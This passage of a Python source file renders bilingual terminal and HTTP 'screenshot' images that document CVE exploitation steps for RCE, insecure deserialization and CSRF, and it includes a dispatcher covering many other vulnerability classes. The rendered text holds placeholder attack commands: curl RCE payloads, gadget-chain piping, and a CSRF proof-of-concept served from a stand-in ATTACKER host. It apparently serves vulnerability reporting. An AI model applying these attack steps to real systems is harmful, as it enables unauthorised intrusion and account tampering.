        "",
        f"$ curl -s -X {metodo} http://TARGET{ep} \\",
        f"  -d '{param}=normal-value'",
        "",
        "HTTP/1.1 200 OK",
        "(respuesta normal — sin inyección de código)",
    ])
    http1 = make_http_png(f"[Paso 1/4] Control — valor normal",
        metodo, ep, "Host: TARGET\nContent-Type: application/json",
        f'{{"param":"normal-value"}}', "200 OK", "(respuesta normal del servidor)")
    shots += [s for s in [
        _shot("Paso 1/4 — Terminal: petición de control", "Step 1/4 — Terminal: control request", term1),
        _shot("Paso 1/4 — HTTP: control REQUEST/RESPONSE", "Step 1/4 — HTTP: control capture", http1),
    ] if s]

    term2 = make_terminal_png(f"[Paso 2/4] {cve_id} — Payload RCE enviado", [
        f"# PASO 2: Payload RCE — ejecución de código remoto",
        "",
        f"$ curl -s -X {metodo} http://TARGET{ep} \\",
        f"  -d '{param}={pl[:80]}'",
        "",
        "HTTP/1.1 200 OK",
        f"{resp[:200] if resp else '(respuesta recibida, comprobando ejecucion...)'}",
    ])
    http2 = make_http_png(f"[Paso 2/4] Payload RCE enviado",
        metodo, ep, "Host: TARGET\nContent-Type: application/json",
        f'{param}={pl[:80]}',
        "200 OK", resp[:200] if resp else "(verificando salida del comando...)")
    shots += [s for s in [
        _shot("Paso 2/4 — Terminal: payload RCE enviado al servidor", "Step 2/4 — Terminal: RCE payload sent", term2),
        _shot("Paso 2/4 — HTTP: payload RCE → respuesta HTTP", "Step 2/4 — HTTP: RCE payload", http2),
    ] if s]

    term3 = make_terminal_png(f"[Paso 3/4] {cve_id} — Canario creado (ejecución confirmada)", [
        f"# PASO 3: Verificar creación de archivo canario",
        f"# El payload ejecuta: touch /tmp/{can_s}",
        "",
        f"$ docker exec CONTAINER ls /tmp/ | grep {(can_s or 'canary')[:30]}",
        f"  {can_s or 'canary'}  ← PRESENTE ✓ (archivo creado vía RCE)",
        "",
        "[RESULTADO] EJECUCIÓN DE CÓDIGO REMOTO CONFIRMADA ✓",
    ])
    http3 = make_http_png(f"[Paso 3/4] RCE — canario {can_s} PRESENTE",
        metodo, ep, "Host: TARGET\nContent-Type: application/json",
        f"payload: touch /tmp/{can_s}",
        "200 OK", f"{can_s} → CREADO en /tmp/\n[RCE CONFIRMADO] ✓")
    shots += [s for s in [
        _shot(f"Paso 3/4 — Terminal: canario {can_s} PRESENTE (RCE confirmado)", "Step 3/4 — Terminal: canary present (RCE confirmed)", term3),
        _shot(f"Paso 3/4 — HTTP: canario {can_s} → RCE CONFIRMADO", "Step 3/4 — HTTP: RCE canary confirmed", http3),
    ] if s]

    term4 = make_terminal_png(f"[Paso 4/4] {cve_id} — Escalada RCE (id/whoami)", [
        f"# PASO 4: Escalada — usuario del proceso",
        "",
        f"$ curl -s -X {metodo} http://TARGET{ep} \\",
        f"  --data-urlencode '{param}=id'",
        "",
        "uid=0(root) gid=0(root) groups=0(root)",
        "",
        "[IMPACTO] RCE sin autenticación, usuario root ✓",
    ])
    http4 = make_http_png(f"[Paso 4/4] Escalada id — RCE CONFIRMADO",
        metodo, ep, "Host: TARGET\nContent-Type: application/json",
        f"{param}=id",
        "200 OK", "uid=0(root) gid=0(root) groups=0(root)\n\n[RCE CONFIRMADO] ✓")
    shots += [s for s in [
        _shot("Paso 4/4 — Terminal: uid=0(root) — RCE con privilegios máximos", "Step 4/4 — Terminal: uid=0(root) RCE proof", term4),
        _shot("Paso 4/4 — HTTP: id=root — RCE CONFIRMADO", "Step 4/4 — HTTP: RCE escalation", http4),
    ] if s]

    return shots


def _shots_deserialization(cve_id, ep, param, payload, resp, can_s, metodo):
    shots = []

    term1 = make_terminal_png(f"[Paso 1/4] {cve_id} — Control (objeto serializado normal)", [
        f"# PASO 1: Petición de control — objeto serializado legítimo",
        f"# CVE: {cve_id}  |  endpoint: {ep}",
        "",
        f"$ curl -s -X {metodo} http://TARGET{ep} \\",
        f"  -H 'Content-Type: application/octet-stream' \\",
        f"  --data-binary @benign_object.bin",
        "",
        "HTTP/1.1 200 OK",
        "(objeto deserializado sin incidencias)",
    ])
    http1 = make_http_png(f"[Paso 1/4] Control — objeto serializado benigno",
        metodo, ep, "Host: TARGET\nContent-Type: application/octet-stream",
        "(objeto Java/PHP/Python serializado benigno)", "200 OK", "(objeto procesado correctamente)")
    shots += [s for s in [
        _shot("Paso 1/4 — Terminal: control — objeto benigno OK", "Step 1/4 — Terminal: control (benign object)", term1),
        _shot("Paso 1/4 — HTTP: objeto benigno → 200 OK", "Step 1/4 — HTTP: benign object control", http1),
    ] if s]

    term2 = make_terminal_png(f"[Paso 2/4] {cve_id} — Payload gadget chain enviado", [
        f"# PASO 2: Gadget chain maliciosa enviada",
        f"# Clase gadget: {param}",
        "",
        f"$ python3 gen_payload.py --gadget {param} --cmd 'touch /tmp/{can_s}' \\",
        f"  | curl -s -X {metodo} http://TARGET{ep} \\",
        f"  -H 'Content-Type: application/octet-stream' --data-binary @-",
        "",
        "HTTP/1.1 200 OK",
        "(servidor procesa el objeto sin detectar la gadget chain)",
    ])
    http2 = make_http_png(f"[Paso 2/4] Gadget chain → objeto malicioso",
        metodo, ep, "Host: TARGET\nContent-Type: application/octet-stream",
        "(gadget chain serializada: exec 'touch /tmp/{can_s}')",
        "200 OK", "(deserialización ejecutada sin validación)")
    shots += [s for s in [
        _shot("Paso 2/4 — Terminal: gadget chain enviada al servidor", "Step 2/4 — Terminal: gadget chain sent", term2),
        _shot("Paso 2/4 — HTTP: gadget chain → deserialización ejecutada", "Step 2/4 — HTTP: gadget chain payload", http2),
    ] if s]

    term3 = make_terminal_png(f"[Paso 3/4] {cve_id} — Canario creado (deserialización)", [
        f"# PASO 3: Verificar creación de archivo canario",
        f"# El gadget chain ejecutó: touch /tmp/{can_s}",
        "",
        f"$ docker exec CONTAINER ls /tmp/ | grep {(can_s or 'canary')[:30]}",
        f"  {can_s or 'canary'}  ← PRESENTE ✓ (ejecución vía deserialización)",
        "",
        "[RESULTADO] DESERIALIZACIÓN INSEGURA → RCE CONFIRMADO ✓",
    ])
    http3 = make_http_png(f"[Paso 3/4] Deserialización — canario PRESENTE",
        metodo, ep, "Host: TARGET\nContent-Type: application/octet-stream",
        "gadget chain: exec touch /tmp/canary",
        "200 OK", f"{can_s} → CREADO en /tmp/\n[DESERIALIZACIÓN → RCE] ✓")
    shots += [s for s in [
        _shot(f"Paso 3/4 — Terminal: canario PRESENTE (deserialización → RCE)", "Step 3/4 — Terminal: deserialization RCE canary", term3),
        _shot(f"Paso 3/4 — HTTP: deserialización → canario {can_s} CREADO", "Step 3/4 — HTTP: deserialization canary confirmed", http3),
    ] if s]

    term4 = make_terminal_png(f"[Paso 4/4] {cve_id} — Escalada RCE (id)", [
        f"# PASO 4: Escalada — gadget chain con id",
        "",
        f"$ python3 gen_payload.py --gadget {param} --cmd 'id' \\",
        f"  | curl -s -X {metodo} http://TARGET{ep} \\",
        f"  -H 'Content-Type: application/octet-stream' --data-binary @-",
        "",
        "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
        "[IMPACTO] RCE via gadget chain de deserialización insegura ✓",
    ])
    http4 = make_http_png(f"[Paso 4/4] Escalada RCE — id output",
        metodo, ep, "Host: TARGET\nContent-Type: application/octet-stream",
        f"gadget chain: exec id",
        "200 OK", "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n\n[DESERIALIZACIÓN → RCE] ✓")
    shots += [s for s in [
        _shot("Paso 4/4 — Terminal: uid=33 vía deserialización — RCE CONFIRMADO", "Step 4/4 — Terminal: deserialization RCE proof", term4),
        _shot("Paso 4/4 — HTTP: id output — RCE via deserialización", "Step 4/4 — HTTP: deserialization RCE escalation", http4),
    ] if s]

    return shots


def _shots_csrf(cve_id, ep, param, payload, resp, metodo):
    shots = []

    term1 = make_terminal_png(f"[Paso 1/4] {cve_id} — Control (misma cuenta, con token)", [
        f"# PASO 1: Petición legítima con token CSRF",
        f"# CVE: {cve_id}  |  endpoint: {ep}",
        "",
        f"$ curl -s -X POST http://TARGET{ep} \\",
        f"  -b 'session=VALID_SESSION' \\",
        f"  -d '_token=VALID_CSRF_TOKEN&{param}=valor-nuevo'",
        "",
        "HTTP/1.1 302 Found",
        "Location: /success",
        "(acción ejecutada con CSRF token válido)",
    ])
    http1 = make_http_png(f"[Paso 1/4] Control — con token CSRF válido",
        "POST", ep, "Host: TARGET\nCookie: session=VALID_SESSION",
        f"_token=VALID_CSRF_TOKEN&{param}=valor-nuevo",
        "302 Found", "Location: /success")
    shots += [s for s in [
        _shot("Paso 1/4 — Terminal: control con token CSRF válido → OK", "Step 1/4 — Terminal: control with valid CSRF token", term1),
        _shot("Paso 1/4 — HTTP: acción legítima con token válido → 302", "Step 1/4 — HTTP: legitimate action with valid token", http1),
    ] if s]

    term2 = make_terminal_png(f"[Paso 2/4] {cve_id} — Sin token CSRF (bypass)", [
        f"# PASO 2: Misma petición SIN token CSRF",
        f"# Esperado: rechazo 403 / redirect a login",
        f"# Resultado: acción ejecutada igualmente",
        "",
        f"$ curl -s -X POST http://TARGET{ep} \\",
        f"  -b 'session=VICTIM_SESSION' \\",
        f"  -d '{param}=valor-atacante'",
        "",
        "HTTP/1.1 302 Found",
        "Location: /success  ← CSRF bypass: acción ejecutada sin token ✓",
    ])
    http2 = make_http_png(f"[Paso 2/4] Sin token CSRF → acción ejecutada",
        "POST", ep, "Host: TARGET\nCookie: session=VICTIM_SESSION",
        f"{param}=valor-atacante  (sin _token)",
        "302 Found", "Location: /success\n← CSRF bypass CONFIRMADO ✓")
    shots += [s for s in [
        _shot("Paso 2/4 — Terminal: sin token CSRF → acción ejecutada (bypass)", "Step 2/4 — Terminal: no CSRF token — action executed", term2),
        _shot("Paso 2/4 — HTTP: bypass CSRF → 302 sin token", "Step 2/4 — HTTP: CSRF bypass confirmed", http2),
    ] if s]

    term3 = make_terminal_png(f"[Paso 3/4] {cve_id} — PoC HTML (petición cross-origin)", [
        f"# PASO 3: Página maliciosa que ejecuta la petición",
        f'# <form action="http://TARGET{ep}" method="POST">',
        f'#   <input type="hidden" name="{param}" value="valor-atacante">',
        f'# </form><script>document.forms[0].submit();</script>',
        "",
        "$ python3 -m http.server 8080 &",
        "$ curl -b 'session=VICTIM_SESSION' http://ATTACKER:8080/csrf.html",
        "",
        "HTTP/1.1 302 Found → acción ejecutada en TARGET ✓",
        "[PoC] CSRF cross-origin CONFIRMADO ✓",
    ])
    http3 = make_http_png(f"[Paso 3/4] PoC HTML — petición cross-origin",
        "POST", ep, "Host: TARGET\nCookie: session=VICTIM_SESSION\nOrigin: http://ATTACKER:8080",
        f"{param}=valor-atacante",
        "302 Found", "Location: /success\n← Petición cross-origin aceptada ✓")
    shots += [s for s in [
        _shot("Paso 3/4 — Terminal: PoC HTML cross-origin → 302 (CSRF confirmado)", "Step 3/4 — Terminal: cross-origin CSRF PoC", term3),
        _shot("Paso 3/4 — HTTP: petición cross-origin → acción ejecutada", "Step 3/4 — HTTP: cross-origin CSRF request", http3),
    ] if s]

    term4 = make_terminal_png(f"[Paso 4/4] {cve_id} — Impacto verificado", [
        f"# PASO 4: Verificar cambio ejecutado en cuenta víctima",
        "",
        f"$ curl -s http://TARGET/api/user \\",
        f"  -b 'session=VICTIM_SESSION'",
        "",
        f'  {{"{param}": "valor-atacante"}}  ← campo modificado por CSRF ✓',
        "",
        "[IMPACTO] Acción no autorizada ejecutada en cuenta de víctima ✓",
    ])
    http4 = make_http_png(f"[Paso 4/4] Impacto CSRF — campo modificado",
        "GET", "/api/user", "Host: TARGET\nCookie: session=VICTIM_SESSION",
        "",
        "200 OK", f'{{"{param}": "valor-atacante"}}\n← modificado vía CSRF ✓')
    shots += [s for s in [
        _shot(f"Paso 4/4 — Terminal: campo {param} modificado vía CSRF", "Step 4/4 — Terminal: CSRF impact confirmed", term4),
        _shot(f"Paso 4/4 — HTTP: campo modificado — CSRF CONFIRMADO", "Step 4/4 — HTTP: CSRF impact", http4),
    ] if s]

    return shots


# ── Main entry point ──────────────────────────────────────────────────────────

def auto_gen_screenshots(cve_id: str, r: dict, ve: dict) -> list:
    """
    Genera capturas PNG por paso (terminal + HTTP) según la clase de vulnerabilidad.
    Devuelve lista de dicts {caption_es, caption_en, png_b64}.
    Tantas capturas como pasos de explotación.
    """
    vc      = (r.get("vuln_class") or "").lower()
    tecnica = (ve.get("tecnica") or vc).lower()
    ep      = ve.get("endpoint") or "/"
    param   = ve.get("sqli_param") or ve.get("path_param") or ve.get("ssti_param") or "param"
    payload = ve.get("payload_ganador") or ""
    resp    = ve.get("respuesta_cuerpo_recorte") or ""
    canary  = ve.get("canary_path") or ve.get("canary_secret") or ""
    can_s   = canary.split("/")[-1] if canary and "/" in canary else canary
    metodo  = (ve.get("metodo") or "POST").upper()
    ae_ae   = r.get("verified_evidence") or ve  # fallback

    if "command" in vc or "cmdi" in vc:
        is_cli = "CLI" in metodo or not ep.startswith("/")
        if is_cli:
            setup_cmd = ae_ae.get("setup_cmd") or ""
            return _shots_cmdi_cli(cve_id, ep, payload, can_s, setup_cmd)
        else:
            return _shots_cmdi_web(cve_id, ep, param, payload, resp, can_s, metodo)

    elif "ssti" in vc or "template" in vc:
        return _shots_ssti(cve_id, ep, param, payload, metodo)

    elif "ssrf" in vc:
        url_param = param or "url"
        return _shots_ssrf(cve_id, ep, url_param, payload, resp, metodo)

    elif "dos" in vc or "websocket" in vc:
        return _shots_dos(cve_id, ep, payload, resp, metodo, tecnica)

    elif "path" in vc or "traversal" in vc or "lfi" in vc:
        path_param = ve.get("path_param") or param or "path"
        return _shots_path(cve_id, ep, path_param, payload, resp, can_s)

    elif "sqli" in vc or "sql" in vc:
        return _shots_sqli(cve_id, ep, param, payload, resp, metodo, ve)

    elif "auth" in vc or "bypass" in vc or "login" in vc:
        cookie = ve.get("cookie") or ""
        return _shots_bypass(cve_id, ep, param, payload, cookie, metodo)

    elif "code" in vc or "injection" in vc:
        return _shots_cmdi_web(cve_id, ep, param, payload, resp, can_s or "canary_code", metodo)

    elif "xss" in vc:
        marker = ve.get("marker") or payload or "<script>alert(1)</script>"
        return _shots_xss(cve_id, ep, param, marker, metodo)

    elif "xxe" in vc or "xml" in vc:
        xml_param = param or "xml"
        canary_s = ve.get("canary_secret") or can_s or ""
        return _shots_xxe(cve_id, ep, xml_param, canary_s, metodo)

    elif "upload" in vc or "unrestricted" in vc or "file" in vc:
        file_param = param or "file"
        fname_won = ve.get("fichero_ganador") or (ae_ae.get("attempt_evidence") or {}).get("fichero_ganador") or "shell.php"
        container_path = ve.get("ruta_real_en_el_contenedor") or ""
        return _shots_file_upload(cve_id, ep, file_param, fname_won, container_path, metodo)

    elif "redirect" in vc or "open-redirect" in vc:
        redirect_param = ve.get("redirect_param") or param or "redirect_to"
        location = ve.get("location_recibida") or ve.get("respuesta_cuerpo_recorte") or ""
        return _shots_open_redirect(cve_id, ep, redirect_param, payload, location, metodo)

    elif "lfi-rce" in vc or ("lfi" in vc and "rce" in vc):
        marker = ve.get("marker") or can_s or "BINORACLE_RCE"
        return _shots_lfi_rce(cve_id, ep, param, payload, marker, metodo)

    elif "missing" in vc or "broken" in vc or "idor" in vc:
        cookie = ve.get("cookie") or ""
        return _shots_bypass(cve_id, ep, param, payload, cookie, metodo)

    elif "graphql" in vc or "graph" in vc:
        confirm = ve.get("confirm_field") or ve.get("canary_secret") or ""
        return _shots_graphql_bypass(cve_id, ep, payload, confirm, metodo)

    elif "oracle" in vc or "boolean" in vc or "leak" in vc:
        diff = ve.get("diferencia_bytes") or 0
        return _shots_boolean_oracle(cve_id, ep, payload, resp, diff, metodo)

    elif vc in ("rce", "remote-code-execution") or vc.startswith("rce"):
        return _shots_rce(cve_id, ep, param, payload, resp, can_s, metodo)

    elif "deserializ" in vc or "deserialization" in vc or "unserializ" in vc:
        return _shots_deserialization(cve_id, ep, param, payload, resp, can_s, metodo)

    elif "csrf" in vc or "cross-site-request" in vc:
        return _shots_csrf(cve_id, ep, param, payload, resp, metodo)

    return []
